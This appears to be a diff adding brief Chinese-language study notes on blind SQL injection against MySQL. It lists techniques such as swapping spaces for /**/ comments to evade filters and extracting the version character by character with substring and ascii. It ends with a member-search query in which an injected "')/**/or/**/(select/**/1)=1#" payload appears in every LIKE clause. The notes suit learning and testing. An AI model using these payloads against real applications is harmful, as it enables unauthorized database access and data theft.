@@ -1,0 +1,10 @@
+select count(*) 返回行數
+select/**/count(*) 語句中空格可用/**/取代
+(select version() 查看mysql版本
+select substring((select version()),1,1); 擷取關鍵字重第一個字,取1個字
+select ascii(substring((select version()),1,1));重第一個字擷取一個字轉成ascii編號
+
+
+
+
+SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%' OR second_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%' OR last_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%' OR login LIKE '%AAAA')/**/or/**/(select/**/1)=1#%');
